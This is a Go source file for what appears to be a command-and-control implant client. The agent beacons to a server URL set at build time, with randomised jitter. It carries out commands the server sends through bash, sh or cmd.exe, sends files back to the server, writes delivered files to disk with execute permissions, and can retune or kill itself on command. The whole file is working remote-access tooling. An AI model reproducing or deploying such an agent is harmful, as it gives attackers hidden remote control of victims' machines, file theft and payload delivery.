package main

import (
	"bufio"
	"bytes"
	"crypto/tls"
	"crypto/x509"
	b64 "encoding/base64"
	"encoding/json"
	"flag"
	"fmt"
	"golang.org/x/net/http2"
	"io/ioutil"
	"math/rand"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"time"
)

// Client settings; derived from go build
var node string
var secret string
var comms string
var flex string
var url string

// Define a global agent to allow runtime updates
var a Client

// Client settings struct
type Client struct {
	Node    	string `json:"node"`
	Arch		string `json:"arch"`
	Os              string `json:"os"`
	Secret  	string `json:"secret"`
	Comms		int    `json:"comms"`
	Flex          	int    `json:"flex"`
	Url             string `json:"url"`
	Boot            bool   `json:"boot"`
	Kill		bool   `json:"kill"`
	Cert            []byte  `json:"cert"`
}

// Client pulse/tasking struct
type Pulse struct {
	Node	string `json:"node"`
	Secret  string `json:"secret"`
	Job     string `json:"job"`
	Results []Result
}

// Individual task
type Task struct {
	Id 	int 	`json:"id"`
	Command string 	`json:"command"`
}

// Array of tasks
type TaskList struct {
	ClientTasking []Task
}

// Individual task result
type Result struct {
	Node   string `json:"node"`
	JobId  int    `json:"jobId"`
	Output string `json:"output"`
}

// Rum command
type RunCommand struct {
	Binary  string
	Command string
	Shell   bool
}

func main() {

	var cert = flag.String("c", "server.crt", "Certificate file")
	flag.Parse()

	if _, err := os.Stat(*cert); os.IsNotExist(err) {
		fmt.Println("[!] Missing certificate file")
		fmt.Println("    Usage: ./client -c server.crt")
		os.Exit(3)
	}

	// Get agent configuration
	configClient(*cert)

	// Start polling
	startPolling()
}

func configClient(s string) {
	a.Node = node
	a.Secret = secret
	a.Arch = runtime.GOARCH
	a.Os = runtime.GOOS
	a.Flex,_ = strconv.Atoi(flex)
	a.Comms,_ = strconv.Atoi(comms)
	a.Url = url
	a.Boot = true
	a.Kill = false
	a.Cert = readCert(s)
}

func readCert(s string) []byte {
	crt,_ := ioutil.ReadFile(s)
	return crt
}

func startPolling() {

	var wg sync.WaitGroup
	stop := make(chan bool)
	ticker := time.NewTicker(1 * time.Second)

	wg.Add(1)
	go func() {
		for {
			if a.Kill {
				wg.Done()
				stop <- true
				return
			}

			rand.Seed(time.Now().UnixNano())
			cf := rand.Intn(2)

			if cf == 1 {
				ticker = time.NewTicker(time.Duration(a.Comms + rand.Intn(a.Flex)) * time.Second)
			} else {
				ticker = time.NewTicker(time.Duration(a.Comms - rand.Intn(a.Flex)) * time.Second)
			}

			select {
			case <-ticker.C:
				getTasks()
			}
		}
	}()
	wg.Wait()
}

func b64Encode(s string) string {
	return b64.StdEncoding.EncodeToString([]byte(s))
}

func b64Decode(s string) []byte {
	x,_ := b64.StdEncoding.DecodeString(s)
	return x
}

func makePostRequest(s string, r []Result, hb Pulse) ([]byte, error) {

	var h Pulse

	switch s {
	case "reboot":
		h = makeTask(a.Node, a.Secret, s, r)
	case "post":
		h = hb
	case "pulse":
		h = makeTask(a.Node, a.Secret, s, r)
	case "update":
		h = hb
	}

	// Marshal pulse
	m, err := json.Marshal(h)
	if err != nil {
		return nil, err
	}

	// Instantiate a http client
	timeout := 10 * time.Second
	client := &http.Client{Transport: transport2(), Timeout: timeout}

	// Post pulse
	resp, err := client.Post(a.Url, "application/json", bytes.NewBuffer(m))
	if err != nil {
		return nil, err
	}

	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}

	return body, nil
}

func makeTask(n string, s string, j string, r []Result ) Pulse {
	h := Pulse{}
	h.Node = n
	h.Secret = s
	h.Job = j
	h.Results = r
	return h
}

func addResult(o string, n string, i int) Result {
	t := Result{}
	t.Node = n
	t.Output = o
	t.JobId = i
	return t
}

func updateSettings() bool {
	body, err := makePostRequest("reboot", nil, Pulse{})

	if err != nil {
		return false
	}

	var t TaskList
	err = json.Unmarshal(body, &t)
	if err != nil {
		return false
	}

	if len(t.ClientTasking) > 0 {
		results := doTasks(t)
		if len(results.Results) > 0 {
			body,_ = makePostRequest("update", nil, results)
		}
	}
	return true
}

func doTasks(t TaskList) Pulse {

	h := makeTask(a.Node, a.Secret, "post", nil)

	for i := 0; i < len(t.ClientTasking); i++ {
		s := strings.TrimSpace(t.ClientTasking[i].Command)
		split := strings.Split(s, " ")

		out := b64Encode("Error running command(s)")

		switch strings.TrimSpace(split[0]) {
		case "/bin/bash":
			out = runTask(split, true)
		case "/bin/sh":
			out = runTask(split, true)
		case "cmd.exe":
			out = runTask(split, true)
		case "pull":
			out = readFile(split[1])
		case "push":
			err := writeFile(split[1], split[2])
			if !err {
				out = b64Encode("Successfully pushed file")
			}
		case "set":
			x, _ := strconv.Atoi(strings.TrimSpace(split[2]))
			if strings.TrimSpace(split[1]) == "comms" {
				a.Comms = x
				out = b64Encode("Comms updated")
			} else if strings.TrimSpace(split[1]) == "flex" {
				a.Flex = x
				out = b64Encode("Flex updated")
			}
		case "kill":
			a.Kill = true
			out = b64Encode("Client successfully killed")
		case "update":
			h.Job = "update"
			token := strings.TrimSpace(split[1])
			out = fmt.Sprintf("%s,%s,%s,%s,%s,%d,%d", token, a.Node, a.Secret, a.Arch, a.Os, a.Comms, a.Flex)
		}

		h.Results = append(h.Results, addResult(out, a.Node, t.ClientTasking[i].Id))
	}

	return h
}

func writeFile(d string, fp string) bool {

	f, err := os.OpenFile(fp, os.O_CREATE|os.O_WRONLY,0755)
	if err != nil {
		return true
	}
	defer f.Close()

	x := b64Decode(d)
	if _,err := f.Write(x); err != nil {
		return true
	}

	if err := f.Sync(); err != nil {
		return true
	}
	return false
}

func readFile(s string) string {
	if _, err := os.Stat(s); err == nil {
		f, err := os.Open(s)
		if err != nil {
			return b64Encode(err.Error())
		} else {
			reader := bufio.NewReader(f)
			content, _ := ioutil.ReadAll(reader)
			return b64.StdEncoding.EncodeToString(content)
		}
	} else {
		return b64Encode(err.Error())
	}
}

// Run task
func runTask(s []string, n bool) string {
	cmd := RunCommand {
		Binary: s[0],
		Command: strings.Join(s[1:], " "),
		Shell: n,
	}
	return b64Encode(execute(cmd))
}

// Get task from server
func getTasks() {

	if a.Boot {
		res := updateSettings()
		if res {
			a.Boot = false
		}
	}

	body, err := makePostRequest("pulse", nil, Pulse{})

	if err != nil {
		return
	}

	var t TaskList
	err2 := json.Unmarshal(body, &t)
	if err2 != nil {
		return
	}

	if len(t.ClientTasking) > 0 {
		results := doTasks(t)
		if len(results.Results) > 0 {
			body, _ = makePostRequest("post", nil, results)
		} else {
			return
		}
	}
}

// Execute shell commands
func execute(c RunCommand) string {

	if c.Shell {
		var out []byte
		var err error

		switch c.Binary {
		case "cmd.exe":
			out,err = exec.Command(c.Binary, "/c", c.Command).Output()
		default:
			out,err = exec.Command(c.Binary, "-c", c.Command).Output()
		}
		if err != nil {
			return err.Error()
		} else {
			return string(out[:])
		}
	} else {
		out, err := exec.Command(c.Binary, c.Command).Output()
		if err != nil {
			return err.Error()
		} else {
			return string(out[:])
		}
	}
}

// Create h2 transport
func transport2() *http2.Transport {
	return &http2.Transport{
		TLSClientConfig:     tlsConfig(),
		DisableCompression:  false,
		AllowHTTP:           false,
	}
}

// Real cert should not need this
func tlsConfig() *tls.Config {

	rootCAs := x509.NewCertPool()
	rootCAs.AppendCertsFromPEM(a.Cert)

	return &tls.Config{
		RootCAs:            rootCAs,
		InsecureSkipVerify: false,
		ServerName:         "localhost",
	}
}
